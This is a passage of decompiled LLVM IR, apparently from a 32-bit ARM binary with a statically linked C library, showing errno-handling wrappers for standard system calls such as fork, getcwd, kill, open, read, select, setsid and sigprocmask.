  store i32 %v1_f77c, i32* %v2_f780, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f788

dec_label_pc_f788:                                ; preds = %entry, %dec_label_pc_f778
  %v0_f788 = phi i32 [ %v0_f768, %entry ], [ -1, %dec_label_pc_f778 ]
  %v2_f78c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_f78c, i32* @r4, align 4
  ret i32 %v0_f788

; uselistorder directives
  uselistorder i32 %v0_f768, { 1, 0, 2 }
  uselistorder i32 ()* @dup2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_f788, { 1, 0 }
}

define i32 @__libc_fork() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f790 = load i32, i32* @r4, align 4
  store i32 %v3_f790, i32* %stack_var_-8, align 4
  %v0_f794 = call i32 @fork()
  store i32 %v0_f794, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_f794, -4095
  br i1 %tmp, label %dec_label_pc_f7b4, label %dec_label_pc_f7a4

dec_label_pc_f7a4:                                ; preds = %entry
  %v0_f7a4 = call i32 @__errno_location()
  %v0_f7a8 = load i32, i32* %r4.global-to-local, align 4
  %v1_f7a8 = sub i32 0, %v0_f7a8
  %v2_f7ac = inttoptr i32 %v0_f7a4 to i32*
  store i32 %v1_f7a8, i32* %v2_f7ac, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f7b4

dec_label_pc_f7b4:                                ; preds = %entry, %dec_label_pc_f7a4
  %v0_f7b4 = phi i32 [ %v0_f794, %entry ], [ -1, %dec_label_pc_f7a4 ]
  %v2_f7b8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_f7b8, i32* @r4, align 4
  ret i32 %v0_f7b4

; uselistorder directives
  uselistorder i32 %v0_f794, { 1, 0, 2 }
  uselistorder i32 ()* @fork, { 1, 0 }
  uselistorder label %dec_label_pc_f7b4, { 1, 0 }
}

define i32 @getcwd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_f7bc = load i32, i32* @r4, align 4
  store i32 %v3_f7bc, i32* %stack_var_-20, align 4
  %v6_f7bc = load i32, i32* @r5, align 4
  %v9_f7bc = load i32, i32* @r6, align 4
  %v12_f7bc = load i32, i32* @r7, align 4
  store i32 %arg2, i32* @r7, align 4
  %v2_f7c0 = icmp eq i32 %arg2, 0
  store i32 %arg1, i32* @r5, align 4
  %v2_f7cc = icmp eq i32 %arg1, 0
  br i1 %v2_f7c0, label %dec_label_pc_f7cc, label %dec_label_pc_f7fc

dec_label_pc_f7cc:                                ; preds = %entry
  br i1 %v2_f7cc, label %dec_label_pc_f7e8, label %dec_label_pc_f7d4

dec_label_pc_f7d4:                                ; preds = %dec_label_pc_f7cc
  %v0_f7d4 = call i32 @__errno_location()
  %v0_f7d8 = load i32, i32* @r7, align 4
  store i32 %v0_f7d8, i32* @r5, align 4
  %v2_f7e0 = inttoptr i32 %v0_f7d4 to i32*
  store i32 22, i32* %v2_f7e0, align 4
  br label %dec_label_pc_f88c

dec_label_pc_f7e8:                                ; preds = %dec_label_pc_f7cc
  %v0_f7e8 = call i32 @__GI_getpagesize()
  %v5_f7f0 = icmp slt i32 %v0_f7e8, 4096
  br i1 %v5_f7f0, label %bb15, label %bb

bb:                                               ; preds = %dec_label_pc_f7e8
  store i32 %v0_f7e8, i32* @r4, align 4
  br label %dec_label_pc_f80c

bb15:                                             ; preds = %dec_label_pc_f7e8
  store i32 4096, i32* @r4, align 4
  br label %dec_label_pc_f80c

dec_label_pc_f7fc:                                ; preds = %entry
  store i32 %arg2, i32* @r4, align 4
  br i1 %v2_f7cc, label %dec_label_pc_f80c, label %bb16

bb16:                                             ; preds = %dec_label_pc_f7fc
  store i32 %arg1, i32* @r6, align 4
  br label %dec_label_pc_f81c

dec_label_pc_f80c:                                ; preds = %dec_label_pc_f7fc, %bb, %bb15
  %v0_f80c = phi i32 [ %v0_f7e8, %bb ], [ 4096, %bb15 ], [ %arg2, %dec_label_pc_f7fc ]
  %v1_f810 = call i32 @malloc(i32 %v0_f80c)
  store i32 %v1_f810, i32* @r6, align 4
  %v2_f814 = icmp eq i32 %v1_f810, 0
  br i1 %v2_f814, label %dec_label_pc_f888, label %dec_label_pc_f80c.dec_label_pc_f81c_crit_edge

dec_label_pc_f80c.dec_label_pc_f81c_crit_edge:    ; preds = %dec_label_pc_f80c
  %v0_f81c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_f81c

dec_label_pc_f81c:                                ; preds = %bb16, %dec_label_pc_f80c.dec_label_pc_f81c_crit_edge
  %v0_f820 = phi i32 [ %v1_f810, %dec_label_pc_f80c.dec_label_pc_f81c_crit_edge ], [ %arg1, %bb16 ]
  %v0_f81c = phi i32 [ %v0_f81c.pre, %dec_label_pc_f80c.dec_label_pc_f81c_crit_edge ], [ %arg2, %bb16 ]
  %v2_f824 = call i32 @getcwd(i32 %v0_f820, i32 %v0_f81c)
  store i32 %v2_f824, i32* @r4, align 4
  %tmp = icmp ult i32 %v2_f824, -4095
  br i1 %tmp, label %dec_label_pc_f844, label %dec_label_pc_f834

dec_label_pc_f834:                                ; preds = %dec_label_pc_f81c
  %v0_f834 = call i32 @__errno_location()
  %v0_f838 = load i32, i32* @r4, align 4
  %v1_f838 = sub i32 0, %v0_f838
  %v2_f83c = inttoptr i32 %v0_f834 to i32*
  store i32 %v1_f838, i32* %v2_f83c, align 4
  br label %dec_label_pc_f874

dec_label_pc_f844:                                ; preds = %dec_label_pc_f81c
  %v1_f844 = icmp slt i32 %v2_f824, 0
  br i1 %v1_f844, label %dec_label_pc_f874, label %dec_label_pc_f84c

dec_label_pc_f84c:                                ; preds = %dec_label_pc_f844
  %v0_f84c = load i32, i32* @r5, align 4
  %v2_f84c = icmp eq i32 %v0_f84c, 0
  br i1 %v2_f84c, label %bb17, label %dec_label_pc_f868.thread7

dec_label_pc_f868.thread7:                        ; preds = %dec_label_pc_f84c
  br label %dec_label_pc_f88c

bb17:                                             ; preds = %dec_label_pc_f84c
  %v1_f850 = load i32, i32* @r7, align 4
  %v3_f850 = icmp eq i32 %v1_f850, 0
  br i1 %v3_f850, label %dec_label_pc_f868, label %dec_label_pc_f868.thread

dec_label_pc_f868.thread:                         ; preds = %bb17
  br label %bb18

dec_label_pc_f868:                                ; preds = %bb17
  %v0_f85c = load i32, i32* @r6, align 4
  %v2_f860 = call i32 @realloc(i32 %v0_f85c, i32 %v2_f824)
  store i32 %v2_f860, i32* @r5, align 4
  %v2_f868 = icmp eq i32 %v2_f860, 0
  br i1 %v2_f868, label %bb18, label %dec_label_pc_f88c

bb18:                                             ; preds = %dec_label_pc_f868.thread, %dec_label_pc_f868
  %v1_f86c = load i32, i32* @r6, align 4
  store i32 %v1_f86c, i32* @r5, align 4
  br label %dec_label_pc_f88c

dec_label_pc_f874:                                ; preds = %dec_label_pc_f844, %dec_label_pc_f834
  %v0_f874 = load i32, i32* @r5, align 4
  %v2_f874 = icmp eq i32 %v0_f874, 0
  br i1 %v2_f874, label %dec_label_pc_f87c, label %dec_label_pc_f888

dec_label_pc_f87c:                                ; preds = %dec_label_pc_f874
  %v0_f87c = load i32, i32* @r6, align 4
  store i32 %v0_f87c, i32* @r0, align 4
  %v0_f880 = call i32 @free()
  br label %dec_label_pc_f88c

dec_label_pc_f888:                                ; preds = %dec_label_pc_f874, %dec_label_pc_f80c
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_f88c

dec_label_pc_f88c:                                ; preds = %dec_label_pc_f868.thread7, %bb18, %dec_label_pc_f868, %dec_label_pc_f87c, %dec_label_pc_f7d4, %dec_label_pc_f888
  %v0_f88c = load i32, i32* @r5, align 4
  %v2_f890 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_f890, i32* @r4, align 4
  store i32 %v6_f7bc, i32* @r5, align 4
  store i32 %v9_f7bc, i32* @r6, align 4
  store i32 %v12_f7bc, i32* @r7, align 4
  ret i32 %v0_f88c

; uselistorder directives
  uselistorder i32 %v2_f824, { 2, 1, 0, 3 }
  uselistorder i32 %v0_f7e8, { 0, 2, 1 }
  uselistorder i32 (i32, i32)* @getcwd, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_f88c, { 5, 3, 1, 2, 0, 4 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_f81c, { 1, 0 }
  uselistorder label %dec_label_pc_f80c, { 0, 2, 1 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v2_f898 = ptrtoint i32* %stack_var_-12 to i32
  %v2_f8a4 = call i32 @getrlimit(i32 7, i32 %v2_f898)
  %v1_f8a8 = icmp slt i32 %v2_f8a4, 0
  br i1 %v1_f8a8, label %bb4, label %bb

bb:                                               ; preds = %entry
  %v5_f8b0 = load i32, i32* %stack_var_-12, align 4
  br label %bb4

bb4:                                              ; preds = %entry, %bb
  %v5_f8b8 = phi i32 [ 256, %entry ], [ %v5_f8b0, %bb ]
  ret i32 %v5_f8b8

; uselistorder directives
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__GI_getpagesize() local_unnamed_addr {
entry:
  %v2_f8c0 = load i32, i32* @global_var_29d70.579, align 4
  %v2_f8c4 = icmp eq i32 %v2_f8c0, 0
  br i1 %v2_f8c4, label %bb, label %bb2

bb:                                               ; preds = %entry
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v1_f8cc = phi i32 [ %v2_f8c0, %entry ], [ 4096, %bb ]
  ret i32 %v1_f8cc

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__libc_getpid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f8d4 = load i32, i32* @r4, align 4
  store i32 %v3_f8d4, i32* %stack_var_-8, align 4
  %v0_f8d8 = call i32 @getpid()
  store i32 %v0_f8d8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_f8d8, -4095
  br i1 %tmp, label %dec_label_pc_f8f8, label %dec_label_pc_f8e8

dec_label_pc_f8e8:                                ; preds = %entry
  %v0_f8e8 = call i32 @__errno_location()
  %v0_f8ec = load i32, i32* %r4.global-to-local, align 4
  %v1_f8ec = sub i32 0, %v0_f8ec
  %v2_f8f0 = inttoptr i32 %v0_f8e8 to i32*
  store i32 %v1_f8ec, i32* %v2_f8f0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f8f8

dec_label_pc_f8f8:                                ; preds = %entry, %dec_label_pc_f8e8
  %v0_f8f8 = phi i32 [ %v0_f8d8, %entry ], [ -1, %dec_label_pc_f8e8 ]
  %v2_f8fc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_f8fc, i32* @r4, align 4
  ret i32 %v0_f8f8

; uselistorder directives
  uselistorder i32 %v0_f8d8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f8f8, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f900 = load i32, i32* @r4, align 4
  store i32 %v3_f900, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_f924, label %dec_label_pc_f914

dec_label_pc_f914:                                ; preds = %entry
  %v0_f914 = call i32 @__errno_location()
  %v0_f918 = load i32, i32* %r4.global-to-local, align 4
  %v1_f918 = sub i32 0, %v0_f918
  %v2_f91c = inttoptr i32 %v0_f914 to i32*
  store i32 %v1_f918, i32* %v2_f91c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_f928.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_f924

dec_label_pc_f924:                                ; preds = %entry, %dec_label_pc_f914
  %v2_f928 = phi i32 [ %v3_f900, %entry ], [ %v2_f928.pre, %dec_label_pc_f914 ]
  %v0_f924 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_f914 ]
  store i32 %v2_f928, i32* @r4, align 4
  ret i32 %v0_f924

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f924, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v0_f948 = load i32, i32* @r0, align 4
  %v3_f948 = call i32 @ioctl(i32 %v0_f948, i32 %arg1, i32 %arg2)
  store i32 %v3_f948, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v3_f948, -4095
  br i1 %tmp, label %dec_label_pc_f968, label %dec_label_pc_f958

dec_label_pc_f958:                                ; preds = %entry
  %v0_f958 = call i32 @__errno_location()
  %v0_f95c = load i32, i32* %r4.global-to-local, align 4
  %v1_f95c = sub i32 0, %v0_f95c
  %v2_f960 = inttoptr i32 %v0_f958 to i32*
  store i32 %v1_f95c, i32* %v2_f960, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f968

dec_label_pc_f968:                                ; preds = %entry, %dec_label_pc_f958
  %v0_f968 = phi i32 [ %v3_f948, %entry ], [ -1, %dec_label_pc_f958 ]
  ret i32 %v0_f968

; uselistorder directives
  uselistorder i32 %v3_f948, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f968, { 1, 0 }
}

define i32 @kill() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f97c = load i32, i32* @r4, align 4
  store i32 %v3_f97c, i32* %stack_var_-8, align 4
  %v0_f980 = call i32 @kill()
  store i32 %v0_f980, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_f980, -4095
  br i1 %tmp, label %dec_label_pc_f9a0, label %dec_label_pc_f990

dec_label_pc_f990:                                ; preds = %entry
  %v0_f990 = call i32 @__errno_location()
  %v0_f994 = load i32, i32* %r4.global-to-local, align 4
  %v1_f994 = sub i32 0, %v0_f994
  %v2_f998 = inttoptr i32 %v0_f990 to i32*
  store i32 %v1_f994, i32* %v2_f998, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f9a0

dec_label_pc_f9a0:                                ; preds = %entry, %dec_label_pc_f990
  %v0_f9a0 = phi i32 [ %v0_f980, %entry ], [ -1, %dec_label_pc_f990 ]
  %v2_f9a4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_f9a4, i32* @r4, align 4
  ret i32 %v0_f9a0

; uselistorder directives
  uselistorder i32 %v0_f980, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f9a0, { 1, 0 }
}

define i32 @__libc_open(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v1_f9b8 = and i32 %arg2, 64
  %v2_f9b8 = icmp eq i32 %v1_f9b8, 0
  br i1 %v2_f9b8, label %.thread1, label %bb

bb:                                               ; preds = %entry
  %v6_f9a8 = load i32, i32* @r2, align 4
  %phitmp = urem i32 %v6_f9a8, 65536
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %v0_f9c8 = phi i32 [ 0, %entry ], [ %phitmp, %bb ]
  store i32 %v0_f9c8, i32* @r2, align 4
  %v4_f9d0 = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %arg2)
  %v7_f9d4 = icmp eq i32 %v4_f9d0, -4096
  store i1 %v7_f9d4, i1* @cpsr_z, align 1
  store i32 %v4_f9d0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_f9d0, -4095
  br i1 %tmp, label %dec_label_pc_f9f0, label %dec_label_pc_f9e0

dec_label_pc_f9e0:                                ; preds = %.thread1
  %v0_f9e0 = call i32 @__errno_location()
  %v0_f9e4 = load i32, i32* %r4.global-to-local, align 4
  %v1_f9e4 = sub i32 0, %v0_f9e4
  %v2_f9e8 = inttoptr i32 %v0_f9e0 to i32*
  store i32 %v1_f9e4, i32* %v2_f9e8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f9f0

dec_label_pc_f9f0:                                ; preds = %.thread1, %dec_label_pc_f9e0
  %v0_f9f0 = phi i32 [ %v4_f9d0, %.thread1 ], [ -1, %dec_label_pc_f9e0 ]
  ret i32 %v0_f9f0

; uselistorder directives
  uselistorder i32 %v4_f9d0, { 2, 0, 3, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_f9f0, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__libc_creat(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r2, align 4
  %v0_fa0c = load i32, i32* @r0, align 4
  %v2_fa0c = inttoptr i32 %v0_fa0c to i8*
  %v3_fa0c = call i32 @__libc_open(i8* %v2_fa0c, i32 577)
  %v0_fa10 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_fa10, label %bb, label %bb2

bb:                                               ; preds = %entry
  %v6_fa10 = and i32 %v3_fa0c, 36
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v7_fa10 = phi i32 [ %v3_fa0c, %entry ], [ %v6_fa10, %bb ]
  ret i32 %v7_fa10

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__GI_pipe(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_fa14 = load i32, i32* @r4, align 4
  store i32 %v3_fa14, i32* %stack_var_-8, align 4
  %v1_fa18 = insertvalue [2 x i32] undef, i32 %arg1, 0
  %v2_fa18 = call i32 @pipe([2 x i32] %v1_fa18)
  store i32 %v2_fa18, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_fa18, -4095
  br i1 %tmp, label %dec_label_pc_fa38, label %dec_label_pc_fa28

dec_label_pc_fa28:                                ; preds = %entry
  %v0_fa28 = call i32 @__errno_location()
  %v0_fa2c = load i32, i32* %r4.global-to-local, align 4
  %v1_fa2c = sub i32 0, %v0_fa2c
  %v2_fa30 = inttoptr i32 %v0_fa28 to i32*
  store i32 %v1_fa2c, i32* %v2_fa30, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_fa38

dec_label_pc_fa38:                                ; preds = %entry, %dec_label_pc_fa28
  %v0_fa38 = phi i32 [ %v2_fa18, %entry ], [ -1, %dec_label_pc_fa28 ]
  %v2_fa3c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_fa3c, i32* @r4, align 4
  ret i32 %v0_fa38

; uselistorder directives
  uselistorder i32 %v2_fa18, { 1, 0, 2 }
  uselistorder label %dec_label_pc_fa38, { 1, 0 }
}

define i32 @prctl() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_fa40 = load i32, i32* @r4, align 4
  store i32 %v3_fa40, i32* %stack_var_-8, align 4
  %v0_fa48 = call i32 @prctl()
  store i32 %v0_fa48, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_fa48, -4095
  br i1 %tmp, label %dec_label_pc_fa68, label %dec_label_pc_fa58

dec_label_pc_fa58:                                ; preds = %entry
  %v0_fa58 = call i32 @__errno_location()
  %v0_fa5c = load i32, i32* %r4.global-to-local, align 4
  %v1_fa5c = sub i32 0, %v0_fa5c
  %v2_fa60 = inttoptr i32 %v0_fa58 to i32*
  store i32 %v1_fa5c, i32* %v2_fa60, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_fa68

dec_label_pc_fa68:                                ; preds = %entry, %dec_label_pc_fa58
  %v0_fa68 = phi i32 [ %v0_fa48, %entry ], [ -1, %dec_label_pc_fa58 ]
  %v2_fa6c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_fa6c, i32* @r4, align 4
  ret i32 %v0_fa68

; uselistorder directives
  uselistorder i32 %v0_fa48, { 1, 0, 2 }
  uselistorder i32 ()* @prctl, { 1, 0 }
  uselistorder label %dec_label_pc_fa68, { 1, 0 }
}

define i32 @__libc_read(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_fa70 = load i32, i32* @r4, align 4
  store i32 %v3_fa70, i32* %stack_var_-8, align 4
  %v1_fa74 = load i32, i32* @r1, align 4
  %v2_fa74 = inttoptr i32 %v1_fa74 to i32*
  %v3_fa74 = load i32, i32* @r2, align 4
  %v4_fa74 = call i32 @read(i32 %arg1, i32* %v2_fa74, i32 %v3_fa74)
  store i32 %v4_fa74, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_fa74, -4095
  br i1 %tmp, label %dec_label_pc_fa94, label %dec_label_pc_fa84

dec_label_pc_fa84:                                ; preds = %entry
  %v0_fa84 = call i32 @__errno_location()
  %v0_fa88 = load i32, i32* %r4.global-to-local, align 4
  %v1_fa88 = sub i32 0, %v0_fa88
  %v2_fa8c = inttoptr i32 %v0_fa84 to i32*
  store i32 %v1_fa88, i32* %v2_fa8c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_fa94

dec_label_pc_fa94:                                ; preds = %entry, %dec_label_pc_fa84
  %v0_fa94 = phi i32 [ %v4_fa74, %entry ], [ -1, %dec_label_pc_fa84 ]
  %v2_fa98 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_fa98, i32* @r4, align 4
  ret i32 %v0_fa94

; uselistorder directives
  uselistorder i32 %v4_fa74, { 1, 0, 2 }
  uselistorder label %dec_label_pc_fa94, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_fa9c = load i32, i32* @r4, align 4
  store i32 %v3_fa9c, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_fac4, label %dec_label_pc_fab4

dec_label_pc_fab4:                                ; preds = %entry
  %v0_fab4 = call i32 @__errno_location()
  %v0_fab8 = load i32, i32* %r4.global-to-local, align 4
  %v1_fab8 = sub i32 0, %v0_fab8
  %v2_fabc = inttoptr i32 %v0_fab4 to i32*
  store i32 %v1_fab8, i32* %v2_fabc, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_fac8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_fac4

dec_label_pc_fac4:                                ; preds = %entry, %dec_label_pc_fab4
  %v2_fac8 = phi i32 [ %v3_fa9c, %entry ], [ %v2_fac8.pre, %dec_label_pc_fab4 ]
  %v0_fac4 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_fab4 ]
  store i32 %v2_fac8, i32* @r4, align 4
  ret i32 %v0_fac4

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_fac4, { 1, 0 }
}

define i32 @__GI_setsid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_facc = load i32, i32* @r4, align 4
  store i32 %v3_facc, i32* %stack_var_-8, align 4
  %v0_fad0 = call i32 @setsid()
  store i32 %v0_fad0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_fad0, -4095
  br i1 %tmp, label %dec_label_pc_faf0, label %dec_label_pc_fae0

dec_label_pc_fae0:                                ; preds = %entry
  %v0_fae0 = call i32 @__errno_location()
  %v0_fae4 = load i32, i32* %r4.global-to-local, align 4
  %v1_fae4 = sub i32 0, %v0_fae4
  %v2_fae8 = inttoptr i32 %v0_fae0 to i32*
  store i32 %v1_fae4, i32* %v2_fae8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_faf0

dec_label_pc_faf0:                                ; preds = %entry, %dec_label_pc_fae0
  %v0_faf0 = phi i32 [ %v0_fad0, %entry ], [ -1, %dec_label_pc_fae0 ]
  %v2_faf4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_faf4, i32* @r4, align 4
  ret i32 %v0_faf0

; uselistorder directives
  uselistorder i32 %v0_fad0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_faf0, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_faf8 = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v3_faf8, label %.thread, label %bb

.thread:                                          ; preds = %entry
  %v3_fb005 = load i32, i32* @r4, align 4
  store i32 %v3_fb005, i32* %stack_var_-8, align 4
  br label %dec_label_pc_fb20

bb:                                               ; preds = %entry
  %v3_fb00 = load i32, i32* @r4, align 4
  store i32 %v3_fb00, i32* %stack_var_-8, align 4
  %tmp12 = icmp ult i32 %arg1, 3
  br i1 %tmp12, label %dec_label_pc_fb20, label %dec_label_pc_fb0c

dec_label_pc_fb0c:                                ; preds = %bb
  %v0_fb0c = call i32 @__errno_location()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_fb18 = inttoptr i32 %v0_fb0c to i32*
  store i32 22, i32* %v2_fb18, align 4
  %v0_fb44.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_fb44

dec_label_pc_fb20:                                ; preds = %.thread, %bb
  %v7_fb20 = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp)
  store i32 %v7_fb20, i32* %r4.global-to-local, align 4
  %tmp13 = icmp ult i32 %v7_fb20, -4095
  br i1 %tmp13, label %dec_label_pc_fb40, label %dec_label_pc_fb30

dec_label_pc_fb30:                                ; preds = %dec_label_pc_fb20
  %v0_fb30 = call i32 @__errno_location()
  %v0_fb34 = load i32, i32* %r4.global-to-local, align 4
  %v1_fb34 = sub i32 0, %v0_fb34
  %v2_fb38 = inttoptr i32 %v0_fb30 to i32*
  store i32 %v1_fb34, i32* %v2_fb38, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_fb40

dec_label_pc_fb40:                                ; preds = %dec_label_pc_fb20, %dec_label_pc_fb30
  %v0_fb40 = phi i32 [ %v7_fb20, %dec_label_pc_fb20 ], [ -1, %dec_label_pc_fb30 ]
  store i32 %v0_fb40, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_fb44

dec_label_pc_fb44:                                ; preds = %dec_label_pc_fb0c, %dec_label_pc_fb40
  %v0_fb44 = phi i32 [ %v0_fb44.pre, %dec_label_pc_fb0c ], [ %v0_fb40, %dec_label_pc_fb40 ]
  %v2_fb48 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_fb48, i32* @r4, align 4
  ret i32 %v0_fb44

; uselistorder directives
  uselistorder i32 %v7_fb20, { 1, 0, 2 }
  uselistorder i32* %stack_var_-8, { 1, 2, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder %_TYPEDEF_sigset_t* %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_fb44, { 1, 0 }
  uselistorder label %dec_label_pc_fb40, { 1, 0 }
  uselistorder label %dec_label_pc_fb20, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_fb4c = load i32, i32* @r4, align 4
  store i32 %v3_fb4c, i32* %stack_var_-8, align 4
  %v2_fb50 = call i32 @time(i32* %arg1)
  store i32 %v2_fb50, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_fb50, -4095
  br i1 %tmp, label %dec_label_pc_fb70, label %dec_label_pc_fb60

dec_label_pc_fb60:                                ; preds = %entry
  %v0_fb60 = call i32 @__errno_location()
  %v0_fb64 = load i32, i32* %r4.global-to-local, align 4
  %v1_fb64 = sub i32 0, %v0_fb64
  %v2_fb68 = inttoptr i32 %v0_fb60 to i32*
  store i32 %v1_fb64, i32* %v2_fb68, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_fb70

dec_label_pc_fb70:                                ; preds = %entry, %dec_label_pc_fb60
  %v0_fb70 = phi i32 [ %v2_fb50, %entry ], [ -1, %dec_label_pc_fb60 ]
  %v2_fb74 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_fb74, i32* @r4, align 4
  ret i32 %v0_fb70

; uselistorder directives
  uselistorder i32 %v2_fb50, { 1, 0, 2 }
  uselistorder label %dec_label_pc_fb70, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_fb7c = call i32 @wait4()
  ret i32 %v0_fb7c
}

define i32 @__libc_write(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_fb80 = load i32, i32* @r4, align 4
